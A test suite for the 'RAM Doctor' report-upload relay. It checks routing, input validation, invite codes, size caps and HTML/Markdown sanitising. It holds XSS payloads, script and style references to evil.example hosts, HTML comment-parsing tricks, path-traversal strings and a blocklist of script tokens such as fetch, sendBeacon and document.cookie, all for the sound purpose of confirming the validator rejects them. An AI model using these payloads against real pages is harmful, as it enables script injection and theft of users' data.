// Tests for the RAM Doctor relay (protocol v1). Run:  cd server && node --test
// Uses only node:test and a mocked global fetch - no network, no real GitHub, no real secrets.
import test from 'node:test';
import assert from 'node:assert/strict';
import worker from '../worker/src/index.js';
import {
  handle, slugify, validatePayload, parseInviteCodes, checkInvite, timingSafeEqualBytes, utcStamp, rateHit,
  commitFiles, sanitizeSummary, checkPlanJson, checkReportHtml, authMode,
  HttpError, LIMITS, MAX_BODY_BYTES, MAX_FILE_BYTES, FILE_CAPS, MAX_SCRIPT_BYTES,
} from '../worker/src/lib.js';

const TOKEN = 'github_pat_TEST_TOKEN_DO_NOT_LEAK'; // allow-secret-scan (fake value for tests)
const CODE = 'RD-TEST-CODE-0001';
const NOW = Date.UTC(2026, 9, 24, 10, 15, 0); // 2026-10-24T10:15:00Z
const STAMP = '20261024-101500';
const VT64 = 'a1b2c3d4'.repeat(8);

const BASE_ENV = Object.freeze({
  GITHUB_TOKEN: TOKEN,
  GITHUB_OWNER: 'iiKurro',
  GITHUB_REPO: 'ram-doctor-reports',
  GITHUB_BRANCH: 'main',
});
/** CODE mode: INVITE_CODES set, KV optional. */
const ENV = Object.freeze(Object.assign({}, BASE_ENV, { INVITE_CODES: JSON.stringify({ [CODE]: 'friend-label' }) }));
/** OPEN mode: no invite codes, KV mandatory. */
const openEnv = (kv) => Object.assign({}, BASE_ENV, { RATE: kv || makeKv() });

const GOOD_REPORT =
  '<!doctype html><!-- ram-doctor-report v1.0.0 --><html lang="ar" dir="rtl"><head><meta charset="utf-8">' +
  '<meta name="viewport" content="width=device-width, initial-scale=1"><title>RAM Doctor</title>' +
  '<style>:root{--bg:#fff;color-scheme:light dark}body{background:var(--bg)}.bar div{width:12%;background:var(--c1)}</style>' +
  '</head><body><main><h1>تقرير</h1><p class="note">UNIQUE_REPORT_MARKER</p>' +
  '<a href="https://www.virustotal.com/gui/file/' + VT64 + '" target="_blank" rel="noopener">VT</a> ' +
  '<a href="https://github.com/iiKurro/ram-doctor">repo</a> <a href="#top">top</a>' +
  '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 8"><path d="M0 0h8v8z" fill="url(#g)"/></svg></main>' +
  '<script>document.documentElement.setAttribute("data-theme","dark")</script></body></html>';

const GOOD_PLAN = JSON.stringify({
  tool: 'RAM-Doctor', version: '1.0.0', host: '<PC>', created: '2026-10-24 10:00:00', isAdmin: true,
  verdict: { Level: 'high', Headline: 'x' }, observations: [{ Level: 'high', Title: 't', Body: 'b' }],
  memory: { TotalGB: 16 }, suspects: [{ id: 1, risk: 'High', name: 'svch0st.exe', reasons: ['r'], procs: [{ pid: 1, remote: [] }] }],
});

// ------------------------------------------------------------------------------------------------ helpers

function payload(over) {
  return Object.assign(
    {
      v: 1,
      displayName: 'Friend One',
      userId: '0a1b2c3d',
      code: CODE,
      tool: { name: 'RAM-Doctor', version: '1.0.0' },
      createdAt: '2020-01-01T00:00:00Z',
      host: '<PC>',
      files: [
        { name: 'summary.md', content: '# Summary\nمرحبا UNIQUE_CONTENT_MARKER' },
        { name: 'report.html', content: GOOD_REPORT },
        { name: 'plan.json', content: GOOD_PLAN },
      ],
    },
    over || {},
  );
}

function req(body, opts) {
  const o = opts || {};
  const method = o.method || 'POST';
  const init = { method, headers: Object.assign({ 'content-type': 'application/json' }, o.headers || {}) };
  if (method !== 'GET' && method !== 'HEAD') {
    init.body = typeof body === 'string' || body instanceof Uint8Array ? body : JSON.stringify(body);
  }
  return new Request('https://relay.test' + (o.path || '/v1/reports'), init);
}

const sha = (ch, n) => String(n).padStart(40, ch);
const ipHdr = (i) => ({ 'CF-Connecting-IP': '203.0.113.' + (i % 250) + ':' + Math.floor(i / 250) });

/** Minimal GitHub Git-Data API mock that records every call. */
function mockGithub(opts) {
  const o = opts || {};
  const heads = o.heads || [sha('a', 1)];
  const patch = o.patch || [200];
  const calls = [];
  let refN = 0, patchN = 0, blobN = 0, treeN = 0, commitN = 0;
  const json = (status, obj) => new Response(JSON.stringify(obj), { status });
  async function fetchMock(url, init) {
    const i = init || {};
    const u = new URL(url);
    const method = (i.method || 'GET').toUpperCase();
    const call = {
      method,
      host: u.host,
      path: u.pathname.replace('/repos/iiKurro/ram-doctor-reports', ''),
      body: i.body ? JSON.parse(i.body) : undefined,
      headers: new Headers(i.headers || {}),
    };
    calls.push(call);
    if (o.override) {
      const r = o.override(call, calls.length);
      if (r) return r;
    }
    if (method === 'GET' && /^\/git\/ref\/heads\//.test(call.path)) {
      return json(200, { object: { sha: heads[Math.min(refN++, heads.length - 1)] } });
    }
    if (method === 'GET' && /^\/git\/commits\/[0-9a-f]{40}$/.test(call.path)) {
      return json(200, { sha: call.path.split('/').pop(), tree: { sha: sha('e', 1) } });
    }
    if (method === 'POST' && call.path === '/git/blobs') return json(201, { sha: sha('b', ++blobN) });
    if (method === 'POST' && call.path === '/git/trees') return json(201, { sha: sha('c', ++treeN) });
    if (method === 'POST' && call.path === '/git/commits') return json(201, { sha: sha('d', ++commitN) });
    if (method === 'PATCH' && /^\/git\/refs\/heads\//.test(call.path)) {
      const st = patch[Math.min(patchN++, patch.length - 1)];
      return st === 200 ? json(200, { ref: 'refs/heads/main' }) : json(st, { message: 'nope' });
    }
    return json(404, { message: 'not found' });
  }
  return { fetch: fetchMock, calls };
}

function makeKv(failing) {
  const store = new Map();
  return {
    store,
    async get(k) {
      if (failing) throw new Error('kv down');
      return store.has(k) ? store.get(k) : null;
    },
    async put(k, v) {
      if (failing) throw new Error('kv down');
      store.set(k, v);
    },
  };
}

async function post(body, env, gh, extra, nowMs) {
  const g = gh || mockGithub();
  const res = await handle(req(body, extra), env || ENV, { fetch: g.fetch, now: () => (nowMs === undefined ? NOW : nowMs) });
  let json = null;
  try {
    json = await res.clone().json();
  } catch (_) { /* not json */ }
  return { res, json, gh: g };
}

function captureConsole() {
  const lines = [];
  const orig = {};
  for (const m of ['log', 'error', 'warn', 'info', 'debug']) {
    orig[m] = console[m];
    console[m] = (...a) => lines.push(a.map(String).join(' '));
  }
  return { lines, restore: () => { for (const m of Object.keys(orig)) console[m] = orig[m]; } };
}

const withFile = (name, content) => payload({
  files: [
    { name: 'summary.md', content: '# ok' },
    { name: 'report.html', content: GOOD_REPORT },
    { name: 'plan.json', content: GOOD_PLAN },
  ].map((f) => (f.name === name ? { name, content } : f)),
});

// ------------------------------------------------------------------------------------------------ routes

test('health route answers on the default export (and works even when nothing is configured)', async () => {
  const res = await worker.fetch(new Request('https://relay.test/v1/health'), {});
  assert.equal(res.status, 200);
  assert.deepEqual(await res.json(), { ok: true, v: 1 });
  assert.equal(res.headers.get('cache-control'), 'no-store');
  assert.equal((await worker.fetch(new Request('https://relay.test/v1/health/'), {})).status, 200);
  assert.equal((await worker.fetch(new Request('https://relay.test/v1/health', { method: 'HEAD' }), {})).status, 200);
  // still up when disabled / KV missing in open mode
  const off = await handle(new Request('https://relay.test/v1/health'), Object.assign({}, BASE_ENV, { DISABLED: '1' }));
  assert.equal(off.status, 200);
});

test('unknown paths are 404 and wrong methods are 405 with Allow', async () => {
  const nf = await handle(new Request('https://relay.test/nope'), ENV);
  assert.equal(nf.status, 404);
  assert.deepEqual(await nf.json(), { ok: false, error: 'not_found' });
  assert.equal((await handle(new Request('https://relay.test/'), ENV)).status, 404);
  const get = await handle(new Request('https://relay.test/v1/reports'), ENV);
  assert.equal(get.status, 405);
  assert.equal(get.headers.get('allow'), 'POST');
  assert.equal((await handle(new Request('https://relay.test/v1/health', { method: 'POST', body: '{}' }), ENV)).status, 405);
});

test('THERE IS NO READ ROUTE: nothing but POST /v1/reports and GET /v1/health exists', async () => {
  const gh = mockGithub();
  const paths = ['/v1/reports', '/v1/reports/', '/v1/reports/reports', '/v1/reports/0a1b2c3d', '/v1/reports/0a1b2c3d/20261024-101500',
    '/reports', '/reports/user-0a1b2c3d', '/v1', '/v1/', '/v1/list', '/v1/files', '/v1/download', '/v1/users', '/repos/iiKurro/ram-doctor-reports/contents',
    '/.git/config', '/..%2f..%2fetc', '/admin', '/v2/reports'];
  for (const p of paths) {
    for (const method of ['GET', 'HEAD', 'PUT', 'PATCH', 'DELETE', 'OPTIONS']) {
      const res = await handle(new Request('https://relay.test' + p, { method }), openEnv(), { fetch: gh.fetch, now: () => NOW });
      assert.ok(res.status === 404 || res.status === 405, method + ' ' + p + ' -> ' + res.status);
      if (res.status === 200) assert.fail('route must not exist');
    }
  }
  assert.equal(gh.calls.length, 0, 'GitHub is never contacted by anything except an accepted POST /v1/reports');
});

// ------------------------------------------------------------------------------------------------ validation

const INVALID = [
  ['wrong protocol version', { v: 2 }, 'v'],
  ['missing protocol version', { v: undefined }, 'v'],
  ['name too short', { displayName: 'A' }, 'displayName'],
  ['name too long', { displayName: 'x'.repeat(25) }, 'displayName'],
  ['name with traversal', { displayName: '../etc' }, 'displayName'],
  ['name with slash', { displayName: 'Ali/Hassan' }, 'displayName'],
  ['name with html', { displayName: 'Ali<script>' }, 'displayName'],
  ['name leading space', { displayName: ' Ali' }, 'displayName'],
  ['name trailing space', { displayName: 'Ali ' }, 'displayName'],
  ['name Cyrillic', { displayName: 'Иван' }, 'displayName'],
  ['name emoji', { displayName: 'ali😀' }, 'displayName'],
  ['name newline', { displayName: 'Ali\nBob' }, 'displayName'],
  ['name not a string', { displayName: 42 }, 'displayName'],
  ['userId uppercase', { userId: 'ABCDEF12' }, 'userId'],
  ['userId too short', { userId: '1234567' }, 'userId'],
  ['userId traversal', { userId: '../../..' }, 'userId'],
  ['userId non-hex', { userId: 'zzzzzzzz' }, 'userId'],
  ['code not a string', { code: 123 }, 'code'],
  ['code with space', { code: 'a b' }, 'code'],
  ['code too long', { code: 'x'.repeat(129) }, 'code'],
  ['extra top-level field', { extra: 1 }, 'unknown_field'],
  ['tool missing', { tool: undefined }, 'tool'],
  ['tool wrong name', { tool: { name: 'Other', version: '1.0.0' } }, 'tool'],
  ['tool bad version', { tool: { name: 'RAM-Doctor', version: 'v1' } }, 'tool'],
  ['tool extra field', { tool: { name: 'RAM-Doctor', version: '1.0.0', x: 1 } }, 'tool'],
  ['createdAt not a date', { createdAt: 'yesterday' }, 'createdAt'],
  ['createdAt impossible date', { createdAt: '2026-13-45T99:99:99Z' }, 'createdAt'],
  ['createdAt without Z', { createdAt: '2026-01-01T00:00:00' }, 'createdAt'],
  ['host with slash', { host: 'a/b' }, 'host'],
  ['host empty', { host: '' }, 'host'],
  ['host too long', { host: 'x'.repeat(70) }, 'host'],
  ['files empty', { files: [] }, 'files'],
  ['files not an array', { files: 'summary.md' }, 'files'],
  ['too many files', { files: [1, 2, 3, 4].map(() => ({ name: 'summary.md', content: 'x' })) }, 'files'],
  ['unknown file name', { files: [{ name: '../../x', content: 'x' }] }, 'files'],
  ['meta.json is reserved for the server', { files: [{ name: 'meta.json', content: 'x' }] }, 'files'],
  ['duplicate file names', { files: [{ name: 'summary.md', content: 'a' }, { name: 'summary.md', content: 'b' }] }, 'files'],
  ['content not a string', { files: [{ name: 'summary.md', content: 5 }] }, 'files'],
  ['file with extra key', { files: [{ name: 'summary.md', content: 'x', mode: 'x' }] }, 'files'],
  ['content with NUL', { files: [{ name: 'summary.md', content: 'a\u0000b' }] }, 'files'],
  ['content with lone surrogate', { files: [{ name: 'summary.md', content: 'a\ud800b' }] }, 'files'],
];

for (const [title, over, field] of INVALID) {
  test('rejects: ' + title, async () => {
    const body = payload(over);
    for (const k of Object.keys(body)) if (body[k] === undefined) delete body[k];
    const { res, json, gh } = await post(body);
    assert.equal(res.status, 400);
    assert.equal(json.ok, false);
    assert.equal(json.error, 'invalid_request');
    assert.equal(json.field, field);
    assert.equal(gh.calls.length, 0, 'GitHub must not be touched for invalid input');
  });
}

test('rejects non-object bodies, __proto__ keys, bad JSON, bad UTF-8, wrong content-type', async () => {
  for (const raw of ['[]', 'null', '"x"', '123']) {
    const { res, json } = await post(raw);
    assert.equal(res.status, 400, raw);
    assert.equal(json.field, 'body');
  }
  const proto = JSON.stringify(payload()).replace('{"v":1', '{"__proto__":{"x":1},"v":1');
  assert.ok(proto.includes('__proto__'));
  assert.equal((await post(proto)).json.field, 'unknown_field');
  assert.equal((await post('not json')).res.status, 400);
  assert.equal((await post(new Uint8Array([0xff, 0xfe, 0xfd]))).res.status, 400);
  const ct = await post(payload(), ENV, mockGithub(), { headers: { 'content-type': 'text/plain' } });
  assert.equal(ct.res.status, 400);
  assert.equal(ct.json.field, 'content-type');
  assert.equal((await post('')).res.status, 400);
});

test('accepts Arabic, Latin, accented and mixed display names; "code" is optional', () => {
  for (const name of ['علي حسن', 'Ali-علي', 'Ali_99', 'José', 'علي', 'محمد٢٠٢٦', 'x'.repeat(24), 'ab']) {
    assert.equal(validatePayload(payload({ displayName: name })).ok, true, name);
  }
  assert.equal(validatePayload(payload({ host: 'DESKTOP-DEMO' })).ok, true);
  assert.equal(validatePayload(payload({ tool: { name: 'RAM-Doctor', version: '1.2.3-rc.1' } })).ok, true);
  const noCode = payload();
  delete noCode.code;
  assert.equal(validatePayload(noCode).ok, true);
  assert.equal(validatePayload(payload({ code: '' })).ok, true);
});

// ------------------------------------------------------------------------------------------------ OPEN mode (default)

test('open mode: no invite code needed; a presented code is ignored; empty code is fine', async () => {
  const noCode = payload();
  delete noCode.code;
  const a = await post(noCode, openEnv());
  assert.equal(a.res.status, 200);
  const meta = JSON.parse(a.gh.calls.filter((c) => c.path === '/git/blobs')[3].body.content);
  assert.equal(meta.inviteLabel, 'open');
  assert.equal((await post(payload({ code: 'whatever-123' }), openEnv(), undefined, { headers: ipHdr(1) })).res.status, 200);
  assert.equal((await post(payload({ code: '' }), openEnv(), undefined, { headers: ipHdr(2) })).res.status, 200);
});

test('open mode without the KV binding fails closed with 503 (health still works)', async () => {
  const env = Object.assign({}, BASE_ENV); // no RATE, no INVITE_CODES
  const gh = mockGithub();
  const { res, json } = await post(payload(), env, gh);
  assert.equal(res.status, 503);
  assert.deepEqual(json, { ok: false, error: 'unavailable' });
  assert.equal(gh.calls.length, 0);
  assert.equal((await handle(new Request('https://relay.test/v1/health'), env)).status, 200);
});

test('open mode fails closed (503) when KV errors, e.g. quota exhausted', async () => {
  const gh = mockGithub();
  const { res, json } = await post(payload(), openEnv(makeKv(true)), gh);
  assert.equal(res.status, 503);
  assert.deepEqual(json, { ok: false, error: 'unavailable' });
  assert.equal(gh.calls.length, 0);
});

test('REQUIRE_CODE=true without usable codes refuses to run (500); with codes it enforces them', async () => {
  const r = await post(payload(), Object.assign({}, openEnv(), { REQUIRE_CODE: 'true' }));
  assert.equal(r.res.status, 500);
  const ok = await post(payload(), Object.assign({}, openEnv(), { REQUIRE_CODE: 'true', INVITE_CODES: CODE }));
  assert.equal(ok.res.status, 200);
  const noCode = payload();
  delete noCode.code;
  assert.equal((await post(noCode, Object.assign({}, openEnv(), { REQUIRE_CODE: '1', INVITE_CODES: CODE }))).res.status, 401);
  assert.equal(authMode({ INVITE_CODES: '  ' }).enforced, false);
  assert.equal(authMode({ INVITE_CODES: CODE }).enforced, true);
  assert.equal(authMode({ REQUIRE_CODE: 'TRUE' }).required, true);
});

test('kill switch DISABLED=1 => uploads answer 503 immediately; falsy values keep it enabled', async () => {
  for (const v of ['1', 'true', 'TRUE', 'yes', 'on']) {
    const gh = mockGithub();
    const { res, json } = await post(payload(), Object.assign({}, openEnv(), { DISABLED: v }), gh);
    assert.equal(res.status, 503, v);
    assert.deepEqual(json, { ok: false, error: 'disabled' });
    assert.equal(gh.calls.length, 0);
  }
  for (const v of ['0', 'false', '', 'no', undefined]) {
    assert.equal((await post(payload(), Object.assign({}, openEnv(), { DISABLED: v }))).res.status, 200, String(v));
  }
  // kill switch wins even if the rest is misconfigured
  assert.equal((await post(payload(), { DISABLED: '1' })).res.status, 503);
});

// ------------------------------------------------------------------------------------------------ CODE mode (optional)

test('code mode: wrong, missing or empty code => 401 and GitHub untouched', async () => {
  const wrong = await post(payload({ code: 'RD-WRONG-CODE-9999' }));
  assert.equal(wrong.res.status, 401);
  assert.deepEqual(wrong.json, { ok: false, error: 'unauthorized' });
  assert.equal(wrong.gh.calls.length, 0);
  const none = payload();
  delete none.code;
  assert.equal((await post(none)).res.status, 401);
  assert.equal((await post(payload({ code: '' }))).res.status, 401);
});

test('invite codes: JSON map, JSON array, comma list; label sanitising; short codes ignored', () => {
  const m = parseInviteCodes('{"CODE-AAAA-1":"ali","CODE-BBBB-2":"<script>","short":"x"}');
  assert.equal(m.get('CODE-AAAA-1'), 'ali');
  assert.equal(m.get('CODE-BBBB-2'), 'invite-2');
  assert.equal(m.has('short'), false);
  assert.equal(parseInviteCodes('["CODE-AAAA-1","CODE-BBBB-2"]').size, 2);
  const list = parseInviteCodes('CODE-AAAA-1, CODE-BBBB-2\nCODE-CCCC-3');
  assert.equal(list.size, 3);
  assert.equal(list.get('CODE-CCCC-3'), 'invite-3');
  assert.equal(parseInviteCodes('{broken').size, 0);
  assert.equal(parseInviteCodes(undefined).size, 0);
  assert.equal(parseInviteCodes('   ').size, 0);
});

test('comma-list INVITE_CODES works end to end; a malformed INVITE_CODES fails closed (401)', async () => {
  const ok = await post(payload({ code: 'LIST-CODE-777' }), Object.assign({}, ENV, { INVITE_CODES: 'OTHER-CODE-1, LIST-CODE-777' }));
  assert.equal(ok.res.status, 200);
  const closed = await post(payload(), Object.assign({}, ENV, { INVITE_CODES: '{broken' }));
  assert.equal(closed.res.status, 401);
  assert.equal(closed.gh.calls.length, 0);
});

test('checkInvite returns the label of the matching code only', async () => {
  const codes = parseInviteCodes('{"CODE-AAAA-1":"ali","CODE-BBBB-2":"sara"}');
  assert.equal(await checkInvite('CODE-BBBB-2', codes), 'sara');
  assert.equal(await checkInvite('CODE-AAAA-1', codes), 'ali');
  assert.equal(await checkInvite('CODE-AAAA-2', codes), null);
  assert.equal(await checkInvite('CODE-AAAA-1 ', codes), null);
  assert.equal(await checkInvite('x', new Map()), null);
});

test('timingSafeEqualBytes', () => {
  assert.equal(timingSafeEqualBytes(new Uint8Array([1, 2, 3]), new Uint8Array([1, 2, 3])), true);
  assert.equal(timingSafeEqualBytes(new Uint8Array([1, 2, 3]), new Uint8Array([1, 2, 4])), false);
  assert.equal(timingSafeEqualBytes(new Uint8Array([1, 2]), new Uint8Array([1, 2, 3])), false);
});

// ------------------------------------------------------------------------------------------------ slug / stamp / paths

test('slugify', () => {
  assert.equal(slugify('Ali Hassan'), 'ali-hassan');
  assert.equal(slugify('علي'), 'user');
  assert.equal(slugify('علي حسن'), 'user');
  assert.equal(slugify('Ali علي'), 'ali');
  assert.equal(slugify('José'), 'jose');
  assert.equal(slugify('a_b-c'), 'a-b-c');
  assert.equal(slugify('--'), 'user');
  assert.equal(slugify('__'), 'user');
  assert.equal(slugify('A'.repeat(24)), 'a'.repeat(20));
  assert.equal(slugify('abcdefghij klmnopqrst uv'), 'abcdefghij-klmnopqrs');
  assert.match(slugify('../..'), /^[a-z0-9-]+$/);
});

test('utcStamp uses UTC and fixed width', () => {
  assert.equal(utcStamp(Date.UTC(2026, 0, 2, 3, 4, 5)), '20260102-030405');
  assert.equal(utcStamp(NOW), STAMP);
});

test('every path sent to GitHub is inside reports/<slug>-<userId>/<stamp>/ (Arabic name => "user")', async () => {
  const a = await post(payload({ displayName: 'علي حسن' }));
  assert.equal(a.res.status, 200);
  const trees = a.gh.calls.filter((c) => c.path === '/git/trees');
  assert.equal(trees.length, 1);
  for (const e of trees[0].body.tree) {
    assert.ok(e.path.startsWith('reports/user-0a1b2c3d/' + STAMP + '/'), e.path);
    assert.ok(!e.path.includes('..'));
  }
  assert.equal(a.json.folder, 'reports/user-0a1b2c3d/' + STAMP);
});

test('commitFiles refuses an unsafe path even if validation were bypassed', async () => {
  const gh = mockGithub();
  await assert.rejects(
    commitFiles(ENV, { fetch: gh.fetch }, [{ path: '../../.github/workflows/x.yml', content: 'x' }], 'm', NOW),
    (e) => e instanceof HttpError && e.status === 500,
  );
  await assert.rejects(
    commitFiles(ENV, { fetch: gh.fetch }, [{ path: 'reports/Evil/../x/20261024-101500/summary.md', content: 'x' }], 'm', NOW),
    HttpError,
  );
  assert.equal(gh.calls.length, 0);
});

// ------------------------------------------------------------------------------------------------ size limits

test('declared Content-Length over 2 MB => 413 without reading the body', async () => {
  const fakeReq = {
    url: 'https://relay.test/v1/reports',
    method: 'POST',
    headers: new Headers({ 'content-type': 'application/json', 'content-length': String(MAX_BODY_BYTES + 1) }),
    get body() { throw new Error('body must not be read'); },
  };
  const res = await handle(fakeReq, ENV, { fetch: mockGithub().fetch, now: () => NOW });
  assert.equal(res.status, 413);
  assert.deepEqual(await res.json(), { ok: false, error: 'too_large' });
});

test('streamed body over 2 MB without Content-Length => 413', async () => {
  const chunk = new Uint8Array(1024 * 1024).fill(0x61);
  const body = new ReadableStream({ pull(controller) { controller.enqueue(chunk); } });
  const r = new Request('https://relay.test/v1/reports', { method: 'POST', headers: { 'content-type': 'application/json' }, body, duplex: 'half' });
  const res = await handle(r, ENV, { fetch: mockGithub().fetch, now: () => NOW });
  assert.equal(res.status, 413);
});

test('per-file caps: any file > 1.5 MB, summary > 128 KB, report > 512 KB, plan > 512 KB => 413', async () => {
  const huge = await post(withFile('plan.json', 'a'.repeat(MAX_FILE_BYTES + 1)));
  assert.equal(huge.res.status, 413);
  assert.equal(huge.json.error, 'too_large');
  assert.equal(huge.gh.calls.length, 0);
  for (const name of ['summary.md', 'report.html', 'plan.json']) {
    const r = await post(withFile(name, 'a'.repeat(FILE_CAPS[name] + 1)));
    assert.equal(r.res.status, 413, name);
    assert.equal(r.gh.calls.length, 0, name);
  }
  // multi-byte characters count as bytes, not characters
  const wide = await post(withFile('summary.md', 'ع'.repeat(FILE_CAPS['summary.md'] / 2 + 1)));
  assert.equal(wide.res.status, 413);
});

test('files exactly at the caps are accepted', async () => {
  const sum = await post(withFile('summary.md', 'a'.repeat(FILE_CAPS['summary.md'])));
  assert.equal(sum.res.status, 200);
  const padNeeded = FILE_CAPS['report.html'] - Buffer.byteLength(GOOD_REPORT);
  const report = GOOD_REPORT.replace('</main>', '<p>' + 'a'.repeat(padNeeded - 7) + '</p></main>');
  assert.equal(Buffer.byteLength(report), FILE_CAPS['report.html']);
  assert.equal((await post(withFile('report.html', report))).res.status, 200);
});

// ------------------------------------------------------------------------------------------------ content inspection

test('summary.md is sanitised: only <div dir="rtl">, </div>, <br> survive', () => {
  assert.equal(sanitizeSummary('<script>alert(1)</script>'), '&lt;script>alert(1)&lt;/script>');
  assert.equal(sanitizeSummary('<img src=x onerror=alert(1)>'), '&lt;img src=x onerror=alert(1)>');
  assert.equal(sanitizeSummary('<div dir="rtl">مرحبا<br>سطر<br/>سطر</div>'), '<div dir="rtl">مرحبا<br>سطر<br>سطر</div>');
  for (const evil of ['<div dir=\'rtl\'>', '<DIV dir="rtl">', '<div dir="rtl" onclick="x">', '<div>', '<a href="x">', '<!-- c -->', '<iframe src=x>', '<svg onload=x>', '<style>x</style>']) {
    assert.ok(!sanitizeSummary(evil).includes('<'), evil);
  }
  assert.equal(sanitizeSummary('[x](javascript:alert(1))'), '[x](blocked:alert(1))');
  assert.equal(sanitizeSummary('[x]( JavaScript:alert(1))'), '[x]( blocked:alert(1))'); // spacing kept, scheme neutralised
  assert.equal(sanitizeSummary('[x]: data:text/html,hi'), '[x]: blocked:text/html,hi');
  assert.equal(sanitizeSummary('![t](https://evil.example/p.png)'), '\\!\\[t](https://evil.example/p.png)');
  assert.equal(sanitizeSummary('> quote\n# Title\n- item **bold** `code`'), '> quote\n# Title\n- item **bold** `code`');
  // private-use characters cannot be used to spoof the allowed-tag placeholders
  assert.ok(!sanitizeSummary('').includes('<'));
  assert.equal(sanitizeSummary('مرحبا بالعالم'), 'مرحبا بالعالم');
});

test('summary.md: the committed blob is the sanitised text', async () => {
  const r = await post(withFile('summary.md', '# Hi\n<script>steal()</script>\n<div dir="rtl">ok</div>'));
  assert.equal(r.res.status, 200);
  const blob = r.gh.calls.filter((c) => c.path === '/git/blobs')[0].body.content;
  assert.ok(!blob.includes('<script'));
  assert.ok(blob.includes('<div dir="rtl">ok</div>'));
});

test('plan.json must be a bounded JSON object with the expected keys', () => {
  assert.equal(checkPlanJson(GOOD_PLAN).ok, true);
  const mk = (patch) => JSON.stringify(Object.assign(JSON.parse(GOOD_PLAN), patch));
  const bad = [
    ['not json', 'nope'], ['array root', '[]'], ['null', 'null'],
    ['wrong tool', mk({ tool: 'x' })], ['no version', mk({ version: 5 })],
    ['suspects not array', mk({ suspects: {} })], ['too many suspects', mk({ suspects: new Array(201).fill({}) })],
    ['verdict missing', mk({ verdict: 'high' })], ['observations not array', mk({ observations: {} })],
    ['memory not object', mk({ memory: [] })],
    ['__proto__ key', GOOD_PLAN.replace('{"tool"', '{"__proto__":{"a":1},"tool"')],
    ['constructor key', mk({ memory: { constructor: 1 } })],
    ['too deep', mk({ memory: JSON.parse('{"a":'.repeat(12) + '1' + '}'.repeat(12)) })],
    ['huge string', mk({ memory: { s: 'x'.repeat(20001) } })],
    ['too many nodes', mk({ memory: { list: new Array(50001).fill(1) } })],
  ];
  for (const [title, text] of bad) assert.equal(checkPlanJson(text).ok, false, title);
  assert.equal(checkPlanJson(mk({ extraFutureKey: { fine: [1, 2, 3] } })).ok, true, 'extra keys are tolerated');
});

test('invalid plan.json => 400 invalid_request (field plan.json), GitHub untouched', async () => {
  const r = await post(withFile('plan.json', '{"tool":"nope"}'));
  assert.equal(r.res.status, 400);
  assert.deepEqual(r.json, { ok: false, error: 'invalid_request', field: 'plan.json' });
  assert.equal(r.gh.calls.length, 0);
});

test('report.html: the generator-shaped inert document is accepted', () => {
  assert.deepEqual(checkReportHtml(GOOD_REPORT), { ok: true });
  // no script at all is fine too
  assert.equal(checkReportHtml(GOOD_REPORT.replace(/<script>[\s\S]*<\/script>/, '')).ok, true);
  // VT hash casing, github deep links, fragment links, local url(#id) are fine
  assert.equal(checkReportHtml(GOOD_REPORT.replace(VT64, VT64.toUpperCase())).ok, true);
  assert.equal(checkReportHtml(GOOD_REPORT.replace('iiKurro/ram-doctor', 'iiKurro/ram-doctor/releases/latest?x=1#top')).ok, true);
});

const REPORT_EVIL = [
  ['missing marker', (h) => h.replace('<!-- ram-doctor-report v1.0.0 -->', '')],
  ['marker not right after the doctype', (h) => h.replace('<!-- ram-doctor-report v1.0.0 -->', '<!-- other -->').replace('<main>', '<main><!-- ram-doctor-report v1 -->')],
  ['marker with junk version', (h) => h.replace('v1.0.0', 'evil')],
  ['marker with extra text', (h) => h.replace('ram-doctor-report v1.0.0', 'ram-doctor-report v1.0.0 x')],
  ['not html', () => '<!doctype html><!-- ram-doctor-report v1 --> just text'],
  ['comment trick: <!--> is an empty comment, the script after it runs', (h) => h.replace('<main>', '<main><!--><script src="x"></script>-->')],
  ['comment trick: <!---> is an empty comment', (h) => h.replace('<main>', '<main><!---><iframe src="#"></iframe>-->')],
  ['comment trick: --!> closes a comment', (h) => h.replace('<main>', '<main><!-- x --!><iframe src="#"></iframe>-->')],
  ['bogus comment <![CDATA[ ends at the first >', (h) => h.replace('<main>', '<main><![CDATA[ x > <iframe src="#"></iframe> ]]>')],
  ['slash instead of space before an attribute', (h) => h.replace('<h1>', '<h1/onclick=x>')],
  ['unquoted event attribute', (h) => h.replace('<h1>', '<h1 onmouseover=x>')],
  ['upper-case tag name', (h) => h.replace('<main>', '<main><IFRAME src="#"></IFRAME>')],
  ['script url string', (h) => h.replace(/<script>[\s\S]*<\/script>/, '<script>var u="https://evil.example/x"</script>')],
  ['script createElement', (h) => h.replace(/<script>[\s\S]*<\/script>/, '<script>document.createElement("s")</script>')],
  ['unterminated style with url()', (h) => h.replace('</head>', '<style>body{background:url(https://evil.example/x)}')],
  ['xlink:href external', (h) => h.replace('<path', '<use xlink:href="https://evil.example/s.svg#a"/><path')],
  ['formaction', (h) => h.replace('<main>', '<main><button formaction="#">x</button>')],
  ['two scripts', (h) => h.replace('</body>', '<script>var a=1</script></body>')],
  ['external script', (h) => h.replace('<script>document', '<script src="https://evil.example/x.js"></script><script>document')],
  ['script with attributes', (h) => h.replace('<script>', '<script type="module">')],
  ['script too big', (h) => h.replace(/<script>[\s\S]*<\/script>/, '<script>' + '/*' + 'a'.repeat(MAX_SCRIPT_BYTES) + '*/</script>')],
  ['stray closing script', (h) => h.replace(/<script>[\s\S]*<\/script>/, '</script>')],
  ...[
    'fetch("x")', 'new XMLHttpRequest()', 'new WebSocket("x")', 'navigator.sendBeacon("x")', 'eval("1")', 'new Function("1")()',
    'import("x")', 'document.write("x")', 'var l=location.href', 'window.open("x")', 'document.body.innerHTML="x"',
    'img.src = "x"', 'a.href="x"', 'el.setAttribute("src","x")', 'setTimeout("x",1)', 'document.cookie',
  ].map((code) => ['script token: ' + code, (h) => h.replace(/<script>[\s\S]*<\/script>/, '<script>' + code + '</script>')]),
  ['onclick attribute', (h) => h.replace('<h1>', '<h1 onclick="x()">')],
  ['onerror attribute (uppercase)', (h) => h.replace('<h1>', '<h1 ONERROR=x>')],
  ['svg onload', (h) => h.replace('<svg ', '<svg onload="x" ')],
  ['iframe', (h) => h.replace('<main>', '<main><iframe src="#"></iframe>')],
  ['object', (h) => h.replace('<main>', '<main><object data="#"></object>')],
  ['embed', (h) => h.replace('<main>', '<main><embed src="#">')],
  ['form', (h) => h.replace('<main>', '<main><form action="#"></form>')],
  ['base', (h) => h.replace('<head>', '<head><base href="#">')],
  ['link', (h) => h.replace('<head>', '<head><link rel="stylesheet" href="#">')],
  ['meta refresh', (h) => h.replace('<head>', '<head><meta http-equiv="refresh" content="0;url=#">')],
  ['svg animate', (h) => h.replace('<path', '<animate attributeName="href" to="x"/><path')],
